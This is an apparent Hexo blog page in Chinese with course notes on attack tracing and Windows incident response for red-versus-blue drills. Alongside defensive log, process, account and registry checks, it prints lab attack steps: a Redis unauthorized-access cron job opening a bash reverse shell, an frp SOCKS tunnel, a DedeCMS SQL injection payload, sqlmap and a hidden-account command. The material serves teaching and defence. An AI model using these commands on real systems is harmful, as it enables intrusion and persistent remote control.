@@ -1,0 +1,1817 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Hexo">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>Hexo</title>
+    <link rel="icon" type="image/png" href="../../../../../../../favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="../../../../../../../libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="../../../../../../../libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="../../../../../../../libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="../../../../../../../libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="../../../../../../../libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="../../../../../../../css/matery.css">
+    <link rel="stylesheet" type="text/css" href="../../../../../../../css/my.css">
+
+    <script src="../../../../../../../libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="../../../../../../../index.html" class="waves-effect waves-light">
+                    
+                    <img src="../../../../../../../medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Hexo</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../index.html" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="../../../../../../../medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Hexo</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../index.html" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('../../../../../../../medias/featureimages/0.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title"></h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="../../../../../../../libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2023-07-16
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    4.1k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    17 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="../../../../../../../libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="溯源的概念"><a href="#溯源的概念" class="headerlink" title="溯源的概念"></a>溯源的概念</h1><h2 id="溯源的概念-1"><a href="#溯源的概念-1" class="headerlink" title="溯源的概念"></a>溯源的概念</h2><p><strong>通过对受害资产与内网流量进行分析一定程度上还原攻击者的攻击路径与攻击手法</strong></p>
+<p>根据已有的线索，攻击方式以及攻击特征等通过技术手段反查攻击者身份或是组织信息</p>
+<h2 id="溯源应用的场景"><a href="#溯源应用的场景" class="headerlink" title="溯源应用的场景"></a>溯源应用的场景</h2><h3 id="1、HW攻防演练"><a href="#1、HW攻防演练" class="headerlink" title="1、HW攻防演练"></a>1、HW攻防演练</h3><h4 id="护网蓝队"><a href="#护网蓝队" class="headerlink" title="护网蓝队"></a>护网蓝队</h4><p>在HW过程中，蓝队的防守和反制是-个重点，在发现资产受到攻击之后,防守方需要及时进行排查和溯源，通常情况下，溯源需要获取到目标攻击者的一部分个人信息.</p>
+<p><img src="assets/image-20230424150100287.png" alt="image-20230424150100287"></p>
+<h4 id="攻击画像"><a href="#攻击画像" class="headerlink" title="攻击画像"></a>攻击画像</h4><pre class="line-numbers language-none"><code class="language-none">溯源结果如下:
+姓名/ID:
+攻击IP:
+地理位置:
+QQ:
+IP地址所属公司:
+IP地址关联域名:
+邮箱:
+手机号:
+微信/微博/src/id证明: .
+人物照片:
+跳板机(可选) :
+关联攻击事件:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="加分规则"><a href="#加分规则" class="headerlink" title="加分规则"></a>加分规则</h4><table>
+<thead>
+<tr>
+<th>描述<br></th>
+<th>完整还原攻击链条，溯源到黑客的虚拟身份、真实身份,溯<br>源到攻击队员，反控攻击方主机根据程度阶梯给分。<br></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>加分规则<br></td>
+<td>描述详细/思路清晰，提交确凿证据报告，根据溯源攻击者<br>虚拟身份、真实身份的程度，500-3000分，反控攻击方主<br>机，再增加500分/次。</td>
+</tr>
+</tbody></table>
+<h3 id="2、应急响应"><a href="#2、应急响应" class="headerlink" title="2、应急响应"></a>2、应急响应</h3><p>服务器受到黑客的攻击，需要进行攻击事件的溯源。</p>
+<h2 id="溯源的意义"><a href="#溯源的意义" class="headerlink" title="溯源的意义"></a>溯源的意义</h2><ol>
+<li>为警民联动奠定基础。</li>
+<li>对攻击者造成威慑。</li>
+<li>提升安全实战化防护水平。</li>
+</ol>
+<h1 id="如何还原攻击路径"><a href="#如何还原攻击路径" class="headerlink" title="如何还原攻击路径"></a>如何还原攻击路径</h1><h2 id="web入侵的流程"><a href="#web入侵的流程" class="headerlink" title="web入侵的流程"></a>web入侵的流程</h2><ul>
+<li>信息收集</li>
+<li>漏洞扫描</li>
+<li>渗透攻击</li>
+<li>提权</li>
+<li>后渗透</li>
+<li>持续控制</li>
+</ul>
+<h2 id="Windows应急排查"><a href="#Windows应急排查" class="headerlink" title="Windows应急排查"></a>Windows应急排查</h2><h3 id="靶场环境介绍"><a href="#靶场环境介绍" class="headerlink" title="靶场环境介绍"></a>靶场环境介绍</h3><h4 id="攻击机"><a href="#攻击机" class="headerlink" title="攻击机"></a>攻击机</h4><p>win,NAT: 192.168.0.105</p>
+<p>kali,NAT: 192.168.0.132</p>
+<h4 id="web服务器"><a href="#web服务器" class="headerlink" title="web服务器"></a>web服务器</h4><p>win仅主机：192.168.203.150</p>
+<p>win,NAT: 192.168.0.107 </p>
+<h4 id="redis服务器"><a href="#redis服务器" class="headerlink" title="redis服务器"></a>redis服务器</h4><p>kali仅主机：192.168.203.128</p>
+<p><img src="assets/image-20230424154226755.png" alt="image-20230424154226755"></p>
+<h4 id="将流量带出来"><a href="#将流量带出来" class="headerlink" title="将流量带出来"></a>将流量带出来</h4><pre class="line-numbers language-none"><code class="language-none">
+##通过蚁剑上传frpc,访问内网其他机器
+
+win服务端frps.ini:
+[common]
+bind_port = 2098
+
+frps.exe -c frps.ini
+
+
+win客户端frpc.ini：
+[common]
+server_addr = 192.168.0.105
+server_port = 2098
+[socks5]
+type = tcp
+plugin = socks5
+remote_port = 2091
+
+frpc.exe -c frpc.ini
+
+
+kali自带的proxychains4.conf:
+vim /etc/proxychains4.conf
+socks5 192.168.0.105 2091
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="举例：redis未授权访问"><a href="#举例：redis未授权访问" class="headerlink" title="举例：redis未授权访问"></a>举例：redis未授权访问</h4><p>环境：redis-6.0.3版本左右,版本太高会报无权设置<code>dir</code></p>
+<pre class="line-numbers language-none"><code class="language-none">#redis.conf设置：
+vim /home/kali/redis-stable/redis.conf
+bind 192.168.70.3  #启动远程连接
+protected-mode yes --&gt; no  #关闭保护模式
+将133行解除注释并将enable-protected-configs no --&gt; yes #运行修改配置
+:wq 
+
+#重启redis服务
+redis-cli shutdown
+redis-server /home/kali/redis-stable/redis.conf
+ps -ef | grep redis
+
+#或临时启动关闭保护模式
+redis-server --protected-mode no
+
+#监听2222端口
+nc -lvnp 2222
+
+#连接redis
+proxychains4 ./redis-cli -h 192.168.70.3
+
+#redis写隐藏计划任务
+set shell "\n\n*/1 **** /bin/bash -i&gt;&amp;/dev/tcp/192.168.70.3/2222 0&gt;&amp;1\n\n"
+config set dir /var/spool/cron/
+config set dbfilename root
+save
+
+#查看隐藏的计划任务
+cat /var/spool/cron/root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><h4 id="1、什么是日志"><a href="#1、什么是日志" class="headerlink" title="1、什么是日志?"></a>1、什么是日志?</h4><p>日志记录一个服务或应用程序在运行过程中发生的事件和活动。</p>
+<h4 id="2、日志分类"><a href="#2、日志分类" class="headerlink" title="2、日志分类"></a>2、日志分类</h4><h5 id="web日志"><a href="#web日志" class="headerlink" title="web日志"></a>web日志</h5><h6 id="web日志存放路径"><a href="#web日志存放路径" class="headerlink" title="web日志存放路径"></a>web日志存放路径</h6><p>windows默认路径:在安装目录下的logs文件夹下</p>
+<h6 id="tomcat日志"><a href="#tomcat日志" class="headerlink" title="tomcat日志"></a>tomcat日志</h6><p>catalina.out、localhost、 manager、 localhost_ access_ log4种格式日志。</p>
+<h6 id="apache日志、nginx日志、-IIS日志"><a href="#apache日志、nginx日志、-IIS日志" class="headerlink" title="apache日志、nginx日志、 IIS日志 ."></a>apache日志、nginx日志、 IIS日志 .</h6><p>access_ log和error_ log</p>
+<pre class="line-numbers language-none"><code class="language-none">#apache日志
+192.168.10.244 - - [06/Oct/2022:16:31:49 +0800] "GET /dedecms/uploads/plus/recommend.php?action=&amp;aid=1&amp;_FILES[type][tmp_name]=\\%27%20or%20mid=@`\\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`%20limit+0,1),5,6,7,8,9%23@`\\%27`+&amp;_FILES[type][name]=1.jpg&amp;_FILES[type][type]=application/octet-stream&amp;_FILES[type][size]=4294%20```%20![] HTTP/1.1" 200 2837
+
+#sql注入
+sqlmap -u http://192.168.70.7:8091/plus/recommend.php?action=&amp;aid=1&amp;_FILES[type][tmp_name]=*+&amp;_FILES[type][name]=1.jpg&amp;_FILES[type][type]=application/octet-stream&amp;_FILES[type][size]=4294%20```%20![]
+
+#爆破目录
+dirsearch -u http://192.168.70.7:8091<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h6 id="web日志分析工具"><a href="#web日志分析工具" class="headerlink" title="web日志分析工具"></a>web日志分析工具</h6><p>在线工具: <a target="_blank" rel="noopener" href="https://tilipa.zlsam.com/loger/">https://tilipa.zlsam.com/loger/</a></p>
+<h5 id="系统日志"><a href="#系统日志" class="headerlink" title="系统日志"></a>系统日志</h5><p>windows系统日志包含系统日志，安全日志、应用日志等</p>
+<h6 id="敏感事件id"><a href="#敏感事件id" class="headerlink" title="敏感事件id"></a>敏感事件id</h6><ul>
+<li>4624登录成功</li>
+<li>4625登录失败</li>
+<li>4720创建用户</li>
+<li>4634注销成功</li>
+<li>4647用户启动的注销</li>
+<li>4672使用超级用户/管理员用户进行登录</li>
+</ul>
+<p>事件查看器：<code>eventvwr</code></p>
+<pre class="line-numbers language-none"><code class="language-none">#创建隐藏账号
+net user admin$ admin /add<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h6 id="系统日志分析-Log-Parser"><a href="#系统日志分析-Log-Parser" class="headerlink" title="系统日志分析-Log Parser"></a>系统日志分析-Log Parser</h6><p>下载地址：<a target="_blank" rel="noopener" href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">https://www.microsoft.com/en-us/download/details.aspx?id=24659</a></p>
+<pre class="line-numbers language-none"><code class="language-none">登录成功的所有事件
+LogParser -i:EVT -o:DATAGRID "SELECT * FROM c:/Security.evtx where EventID=4624"
+
+指定登录时间范围的事件: 
+LogParser -i:EVT -o:DATAGRID "SELECT * FROM c:/Security.evtx where TimeGenerated &gt; '2023-04-25 12:32:11' and TimeGenerated &lt; '2023-04-26 12:32:11'
+
+提取登录成功的用户名和IP:
+LogParser -i:EVT -o:DATAGRID "SELECT EXTRACT_TOKEN(Message,13,'') as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,'|') as Username,EXTRACT_TOKEN(Message,38,'') as Loginip FROM c:/Security.evtx where EventID=4624
+
+登录失败的所有事件:
+LogParser -i:EVT -o:DATAGRID "SELECT * FROM c:/Security.evtx where EventID=4625"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="3、日志存放的位置"><a href="#3、日志存放的位置" class="headerlink" title="3、日志存放的位置"></a>3、日志存放的位置</h4><h3 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h3><h4 id="文件排查"><a href="#文件排查" class="headerlink" title="文件排查"></a>文件排查</h4><ol>
+<li><p>(1) 各个盘下的temp相关目录<code>%temp%</code></p>
+</li>
+<li><p>(2)开机启动文件(启动菜单、注册表)</p>
+</li>
+<li><p>(3)浏览器的历史记录</p>
+</li>
+<li><p>(4) Recent文件</p>
+</li>
+<li><p>(5)攻击日期内新增的文件</p>
+<pre class="line-numbers language-none"><code class="language-none">forfiles /m *.exe /d 2022/10/5 /s /c "cmd /c echo @path @fdate @ftime"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+<li><p>(6)使用工具D盾、HwsKill、 WebshellKill等</p>
+</li>
+</ol>
+<h4 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h4><pre class="line-numbers language-none"><code class="language-none">临时文件：%temp%
+最近打卡文件：recent
+指定攻击日期后新增的文件：forfiles /m *.exe /d 2023/4/23 /s /c "cmd /c echo @path @fdate @ftime"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="进程分析"><a href="#进程分析" class="headerlink" title="进程分析"></a>进程分析</h3><h4 id="进程排查"><a href="#进程排查" class="headerlink" title="进程排查"></a>进程排查</h4><h5 id="1-查看端口得到PID"><a href="#1-查看端口得到PID" class="headerlink" title="(1) 查看端口得到PID"></a>(1) 查看端口得到PID</h5><pre class="line-numbers language-none"><code class="language-none">netstat -ano | findstr 端口<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h5 id="2-根据PID查看进程对应的程序名称"><a href="#2-根据PID查看进程对应的程序名称" class="headerlink" title="(2)根据PID查看进程对应的程序名称"></a>(2)根据PID查看进程对应的程序名称</h5><pre class="line-numbers language-none"><code class="language-none">tasklist /v | findstr PID
+
+wmic process list brief | findstr PID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h5 id="3-得到程序全路径名"><a href="#3-得到程序全路径名" class="headerlink" title="(3)得到程序全路径名"></a>(3)得到程序全路径名</h5><pre class="line-numbers language-none"><code class="language-none">wmic process where processid=PID get processid,executablepath,name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h5 id="4-杀掉进程"><a href="#4-杀掉进程" class="headerlink" title="(4)杀掉进程"></a>(4)杀掉进程</h5><pre class="line-numbers language-none"><code class="language-none">taskkill /PID 3876 /F
+
+wmic process where name=" mysqld.exe" delete
+
+wmic process where processid=3876 call terminate<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="进程排除工具"><a href="#进程排除工具" class="headerlink" title="进程排除工具"></a>进程排除工具</h4><h5 id="ProcessExplorer"><a href="#ProcessExplorer" class="headerlink" title="ProcessExplorer"></a>ProcessExplorer</h5><p>进程资源管理器</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">https://learn.microsoft.com/zh-cn/sysinternals/downloads/process-explorer</a></p>
+<h3 id="新增、隐藏账号排查"><a href="#新增、隐藏账号排查" class="headerlink" title="新增、隐藏账号排查"></a>新增、隐藏账号排查</h3><ol>
+<li><p>1、通过命令:“<code>net user</code>“查看</p>
+</li>
+<li><p>2、通过“计算机管理”查看。<code>lusrmgr.msc</code></p>
+</li>
+<li><p>3、通过Windows安全 日志进行排查<code>eventvwr</code></p>
+</li>
+<li><p>4、通过查看注册表文件进行排查<code>regedit</code></p>
+</li>
+<li><p>5、通过Windows管理工具</p>
+<pre class="line-numbers language-none"><code class="language-none">wmic useraccount get name,SID<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ol>
+<h3 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h3><ol>
+<li>(1) HKEY_CLASSES_ROOT (HKCR)</li>
+<li>(2) HKEY_CURRENT_USER (HKCU)</li>
+<li>(3) HKEY_LOCAL_MACHINE (HKLM)</li>
+<li>(4) HKEY_USERS (HKU)</li>
+</ol>
+<pre class="line-numbers language-none"><code class="language-none">regedit
+
+#查看所有用户：计算机\HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names
+
+#查看自启动：
+计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="自启动、计划任务"><a href="#自启动、计划任务" class="headerlink" title="自启动、计划任务"></a>自启动、计划任务</h3><h4 id="自启动"><a href="#自启动" class="headerlink" title="自启动"></a>自启动</h4><pre class="line-numbers language-none"><code class="language-none">#查看自启动：
+计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><pre class="line-numbers language-none"><code class="language-none">schtasks.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><h4 id="病毒分析"><a href="#病毒分析" class="headerlink" title="病毒分析"></a>病毒分析</h4><ul>
+<li><p>PCHunter: <a target="_blank" rel="noopener" href="http://www.xuetr.com/">http://www.xuetr.com</a></p>
+</li>
+<li><p>火绒剑: <a target="_blank" rel="noopener" href="https://www.huorong.cn/">https://www.huorong.cn</a></p>
+</li>
+<li><p>Process Explorer: <a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer</a></p>
+</li>
+<li><p>processhacker: <a target="_blank" rel="noopener" href="https://processhacker.sourceforge.io/downloads.php">https://processhacker.sourceforge.io/downloads.php</a></p>
+</li>
+</ul>
+<h4 id="病毒查杀"><a href="#病毒查杀" class="headerlink" title="病毒查杀"></a>病毒查杀</h4><ul>
+<li>卡巴斯基: <a target="_blank" rel="noopener" href="http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe">http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe</a> (推荐理由: 绿色版、最新病毒库)</li>
+<li>大蜘蛛: <a target="_blank" rel="noopener" href="http://free.drweb.ru/download+cureit+free">http://free.drweb.ru/download+cureit+free</a></li>
+</ul>
+<h4 id="病毒动态"><a href="#病毒动态" class="headerlink" title="病毒动态"></a>病毒动态</h4><p>CVERC-国家计算机病毒应急处理中心: <a target="_blank" rel="noopener" href="http://www.cverc.org.cn/">http://www.cverc.org.cn</a></p>
+<p>微步在线威胁情报社区: <a target="_blank" rel="noopener" href="https://x.threatbook.cn/">https://x.threatbook.cn</a></p>
